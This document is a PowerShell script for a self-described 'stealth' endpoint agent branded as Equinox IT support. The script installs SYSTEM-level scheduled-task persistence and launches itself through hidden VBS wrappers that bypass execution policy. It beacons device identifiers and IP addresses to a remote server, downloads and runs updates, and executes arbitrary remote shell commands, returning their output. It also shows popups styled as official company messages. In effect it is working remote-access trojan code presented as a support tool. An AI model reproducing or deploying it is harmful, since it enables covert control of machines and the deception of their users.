param(
    $ServerUrl = "https://unified-manager.vercel.app"
)

# Unified Enterprise Agent (UEA)
# Version: 1.5.8
# Description: Professional stealth endpoint agent with premium Support GUI.

# 1. ENVIRONMENT SANITATION
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = "Stop"
$InstallDir = "$env:ProgramData\UnifiedAgent"
$LogFile = "$InstallDir\agent.log"
$ScriptPath = "$InstallDir\unified-agent.ps1"
$ConfigPath = "$InstallDir\config.json"
# Official Equinox branding
$SupportLogo = "Equinox-Logo-Transparent.png"

function Log-Message {
    param($Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = "[$Timestamp] $Message"
    if ($LogFile) {
        try {
            if (-not (Test-Path (Split-Path $LogFile))) { New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force | Out-Null }
            $Line | Out-File -FilePath $LogFile -Append -Encoding utf8
        } catch {}
    }
}

# 2. GHOST KILLER
try {
    Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | ForEach-Object { 
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue 
    }
} catch {}

# 3. ROBUST INSTALLATION LOGIC
function Install-StealthAgent {
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $IsAdmin) { 
        Log-Message "Installation skipped: Not running as Administrator."
        return 
    }
    try {
        Log-Message "Initiating System-Level Master Reset..."
        # 1. Stop and Clean Persistence Tasks
        Get-ScheduledTask -TaskName "UEA_Persistence" -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName "UEA_Persistence" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        Unregister-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null

        # 2. Aggressive Process Nuke to release file locks
        try {
            $AllPs = Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID }
            foreach ($P in $AllPs) { Stop-Process -Id $P.ProcessId -Force -ErrorAction SilentlyContinue }
            Start-Sleep -Seconds 1
        } catch {}

        # 3. Atomic File Deployment
        if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
        
        Log-Message "Deploying v1.5.7 core binary..."
        $SourceFile = if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) { $PSCommandPath } else { "$InstallDir\temp_agent.ps1" }
        
        if ($SourceFile -match "temp_agent.ps1") {
            (New-Object System.Net.WebClient).DownloadFile("$ServerUrl/api/agent/update", "$SourceFile")
        }

        # Try to move file into place (Atomic overwrite)
        for ($i=0; $i -lt 5; $i++) {
            try {
                Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
                break
            } catch {
                Start-Sleep -Seconds 1
                Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
            }
        }

        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.8" }
        $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
        
        $VbsMainPath = "$InstallDir\uea_stealth.vbs"
        $VbsMainCode = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False"
        $VbsMainCode | Out-File -FilePath $VbsMainPath -Force -Encoding ascii

        # 4. Re-Register and Start Persistence
        $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsMainPath`""
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
        Start-ScheduledTask -TaskName "UEA_Persistence" | Out-Null
        
        Log-Message "Stealth v1.5.8 Deployment Complete."
        if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
            Write-Host "Equinox Stealth Architecture v1.5.8 Deployed. Background process starting..."
            exit
        }
    } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
}

# 4. INITIALIZATION
try {
    $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID } catch { "$($env:COMPUTERNAME)-$(Get-Random)" }
    $SerialNumber = try { (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber } catch { "Unknown" }
    
    # 🛡️ Ghost-Proof Switch: Only install if we are NOT already running as the resident file
    if ($PSCommandPath -ne $ScriptPath) {
        Install-StealthAgent
    }

    if (Test-Path $ConfigPath) {
        $SavedConfig = try { Get-Content $ConfigPath | ConvertFrom-Json } catch { $null }
        if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
    }

    Log-Message "Agent v1.5.8 Started. ID: $AgentId"
    # 5. HEARTBEAT LOOP
    while ($true) {
        try {
            $OS = try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Managed Windows Endpoint" }
            $PubIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -TimeoutSec 5).ip } catch { "ISP Restricted" }
            $LocIp = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPv4Address -notlike "169.254*" } | Select-Object -First 1).IPv4Address } catch { "Unknown" }
            
            $Payload = @{
                agentId = $AgentId
                serialNumber = $SerialNumber
                version = "1.5.8"
                status = "online"
                deviceName = $env:COMPUTERNAME
                os = $OS
                publicIp = $PubIp
                localIp = $LocIp
                isp = "Managed Endpoint"
            }
            $BodyJson = $Payload | ConvertTo-Json
            $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json"

            # Upgrade Hook
            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.8")) {
                Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                Install-StealthAgent
                $VbsRestart = "$InstallDir\restart.vbs"
                "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False" | Out-File -FilePath $VbsRestart -Force -Encoding ascii
                Start-Process "wscript.exe" -ArgumentList "`"$VbsRestart`""
                exit
            }

            # Command Processor
            foreach ($cmd in $Response.commands) {
                try {
                    $Result = ""
                    if ($cmd.type -eq "Message") {
                        $msgContent = $cmd.payload.message
                        $PopupScript = "$InstallDir\popup.ps1"
                        $PopupCode = @"
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
`$Form = New-Object Windows.Forms.Form
`$Form.Text = 'Equinox IT Support'
`$Form.Size = New-Object Drawing.Size(520,300)
`$Form.StartPosition = 'CenterScreen'
`$Form.TopMost = `$true
`$Form.FormBorderStyle = 'FixedDialog'
`$Form.BackColor = [System.Drawing.Color]::White
`$IconBox = New-Object Windows.Forms.PictureBox
`$IconBox.Size = New-Object Drawing.Size(80, 80)
`$IconBox.Location = New-Object Drawing.Point(20, 30)
`$IconBox.SizeMode = 'Zoom'
`$LogoUrl = "$ServerUrl/$SupportLogo"
try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData(`$LogoUrl); `$IconBox.Image = [System.Drawing.Image]::FromStream((New-Object IO.MemoryStream(`$ImgBytes, 0, `$ImgBytes.Length))) } catch { }
`$Header = New-Object Windows.Forms.Label
`$Header.Text = 'EQUINOX IT SUPPORT'
`$Header.ForeColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
`$Header.Font = New-Object Drawing.Font('Segoe UI', 14, [System.Drawing.FontStyle]::Bold)
`$Header.Location = New-Object Drawing.Point(120, 30)
`$Header.Size = New-Object Drawing.Size(350, 30)
`$Disclaimer = New-Object Windows.Forms.Label
`$Disclaimer.Text = '*** OFFICIAL COMPANY COMMUNICATION ***'
`$Disclaimer.Font = New-Object Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
`$Disclaimer.ForeColor = [System.Drawing.Color]::FromArgb(2, 132, 199)
`$Disclaimer.Location = New-Object Drawing.Point(120, 60)
`$Disclaimer.Size = New-Object Drawing.Size(350, 20)
`$Content = New-Object Windows.Forms.Label
`$Content.Text = "$msgContent"
`$Content.Font = New-Object Drawing.Font('Segoe UI', 11)
`$Content.Location = New-Object Drawing.Point(120, 95)
`$Content.Size = New-Object Drawing.Size(360, 80)
`$Legal = New-Object Windows.Forms.Label
`$Legal.Text = 'This message is intended solely for the addressee and may contain confidential information.'
`$Legal.Font = New-Object Drawing.Font('Segoe UI', 7, [System.Drawing.FontStyle]::Italic)
`$Legal.ForeColor = [System.Drawing.Color]::Gray
`$Legal.Location = New-Object Drawing.Point(20, 250)
`$Legal.Size = New-Object Drawing.Size(480, 15)
`$Button = New-Object Windows.Forms.Button
`$Button.Text = 'Acknowledge'
`$Button.Font = New-Object Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
`$Button.Size = New-Object Drawing.Size(180, 45)
`$Button.Location = New-Object Drawing.Point(300, 190)
`$Button.BackColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
`$Button.ForeColor = [System.Drawing.Color]::White
`$Button.FlatStyle = 'Flat'
`$Button.Add_Click({ `$Form.Close() })
`$Form.Controls.AddRange(@(`$IconBox, `$Header, `$Disclaimer, `$Content, `$Legal, `$Button))
`$Form.ShowDialog() | Out-Null
"@
                        $PopupCode | Out-File -FilePath $PopupScript -Force -Encoding utf8
                        $ActiveUser = (Get-CimInstance Win32_ComputerSystem).UserName
                        if ($ActiveUser) {
                            $VbsPopupPath = "$InstallDir\popup_stealth.vbs"
                            "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$PopupScript`"`"`", 0, False" | Out-File -FilePath $VbsPopupPath -Force -Encoding ascii
                            $TaskName = "UEA_Support_$(Get-Random)"
                            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPopupPath`""
                            $Principal = New-ScheduledTaskPrincipal -UserId $ActiveUser -LogonType Interactive
                            Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -Force | Out-Null
                            Start-ScheduledTask -TaskName $TaskName | Out-Null
                            Start-Sleep -Seconds 5
                            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
                            $Result = "Support GUI delivered."
                        }
                    } elseif ($cmd.type -eq "shell") {
                        $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
                    }
                    if ($Result) {
                        $ResultPayload = @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }
                        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body ($ResultPayload | ConvertTo-Json) -ContentType "application/json" | Out-Null
                    }
                } catch { Log-Message "Cmd Fail: $($_.Exception.Message)" }
            }
        } catch {}
        Start-Sleep -Seconds 3
    }
} catch { Log-Message "Fatal: $($_.Exception.Message)" }
